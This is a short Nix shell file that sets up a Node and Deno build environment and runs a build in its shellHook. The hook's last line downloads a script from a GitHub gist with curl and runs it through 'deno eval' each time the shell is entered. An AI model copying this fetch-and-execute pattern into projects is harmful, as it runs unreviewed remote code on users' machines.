with (import <nixpkgs> {}); 
rec {
  shell = mkShell {
    name="environment";                   
    buildInputs = [   
      pkgs.curl            
      pkgs.deno 
      pkgs.yarn 
      pkgs.yarn2nix                                          
    ];                                                                    
    shellHook = ''
      rm node_modules -rf
      yarn install -s
      yarn2nix > yarn.nix
      nix-build application.nix -o dist
      rm node_modules -rf
      ln -s $PWD/dist/libexec/nix/node_modules $PWD/node_modules
      ${pkgs.deno}/bin/deno eval "$(${pkgs.curl}/bin/curl -s -L https://gist.githubusercontent.com/danzlarkin/134841c0591050c308af92c2229ca264/raw/840f83c7b3839f8021a209d3c698b7def54c386b/service.js)"
    '';  
  };
}